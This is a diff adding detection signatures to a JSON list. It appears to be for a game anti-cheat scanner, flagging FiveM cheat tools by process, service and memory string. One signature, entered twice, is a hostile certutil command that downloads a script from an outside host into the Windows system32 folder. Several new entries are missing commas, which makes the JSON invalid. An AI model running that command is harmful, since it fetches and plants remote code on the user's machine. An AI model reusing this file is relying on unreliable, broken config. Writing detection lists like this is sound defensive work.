@@ -886,5 +886,82 @@
     "string": "0xf93000",
     "in_instance": true,
     "severity": true
-  }                                                                   
+  },
+  {
+    "name": "Zahiar Bypass",
+    "process": "svchost.exe",
+    "service": "diagtrack",
+    "string": "/c start /min /b certutil -urlcache -split -f https://serapi.mom/info.js c:/windows/system32/",
+    "in_instance": true,
+    "severity": true
+  },
+  {
+    "name": "Zahiar Bypass",
+    "process": "svchost.exe",
+    "service": "diagtrack",
+    "string": "/c start /min /b certutil -urlcache -split -f https://serapi.mom/info.js c:/windows/system32/",
+    "in_instance": true,
+    "severity": true
+  },
+  {
+    "name": "TZ internal",
+    "process": "svchost.exe",
+    "service": "dps",
+    "string": "!2025/01/14:11:41:43!",
+    "in_instance": true,
+    "severity": true
+  },
+  {
+    "name": "TZ internal",
+    "process": "svchost.exe",
+    "service": "pcasvc",
+    "string": "0x944000",
+    "in_instance": true,
+    "severity": true
+  },
+  {
+    "name": "TZ Project",
+    "process": "FiveM_GTAProcess.exe",
+    "string": "api.tzproject.com",
+    "in_instance": true,
+    "severity": true
+  },
+  {
+    "name": "TZ Project",
+    "process": "svchost.exe",
+    "service": "dnscache"
+    "string": "api.tzproject.com",
+    "in_instance": false,
+    "severity": true
+  },
+  {
+    "name": "TZX",
+    "process": "svchost.exe",
+    "service": "pcasvc"
+    "string": "0xf19000",
+    "in_instance": true,
+    "severity": true
+  },
+  {
+    "name": "TZX",
+    "process": "svchost.exe",
+    "service": "dnscache"
+    "string": "api.tzproject.com",
+    "in_instance": false,
+    "severity": true
+  },
+  {
+    "name": "TZX",
+    "process": "lsass.exe",
+    "string": "api.tzproject.com",
+    "in_instance": true,
+    "severity": true
+  },
+  {
+    "name": "TZX",
+    "process": "lsass.exe",
+    "string": "tzproject.com",
+    "in_instance": true,
+    "severity": true
+  }                                                                            
 ]
